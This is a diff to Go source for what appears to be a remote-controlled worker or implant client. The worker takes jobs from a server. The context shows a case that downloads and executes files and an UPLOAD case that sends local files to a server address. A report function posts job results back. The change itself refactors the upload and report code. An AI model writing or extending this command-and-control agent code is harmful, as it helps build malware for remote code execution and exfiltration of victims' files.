@@ -8,7 +8,9 @@ import (
 	"fmt"
 	"net/http"
 	"os"
+	"path"
 	"strconv"
+	"strings"
 	"time"
 )
 
@@ -173,11 +175,12 @@ func (w *Worker) resolve(job Job) {
 			w.report(job.Id, "File downloaded and executed.")
 		}
 	case UPLOAD:
-		destUrl := buildRequestUrl(UPLOADS_R, w.id, "")
-		if err := utils.UploadFile(args[0], destUrl); err != nil {
+		dest := buildRequestUrl(UPLOADS_R, w.id, "")
+		loc, err := utils.UploadFile(args[0], dest)
+		if err != nil {
 			w.report(job.Id, err.Error())
 		} else {
-			w.report(job.Id, "File uploaded to "+destUrl)
+			w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
 		}
 	case CHDIR:
 		if err := os.Chdir(args[0]); err != nil {
@@ -190,9 +193,9 @@ func (w *Worker) resolve(job Job) {
 	}
 }
 
-func (w *Worker) report(jobId int, rep string) { // TODO: accept only bytes?
-	reportUrl := buildRequestUrl(REPORTS_R, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
-	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", bytes.NewBuffer([]byte(rep)))
+func (w *Worker) report(jobId int, rep string) {
+	reportUrl := buildRequestUrl(REPORTS_R, w.id, strconv.Itoa(jobId))
+	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", strings.NewReader(rep))
 	if err == nil {
 		resp.Body.Close()
 	}
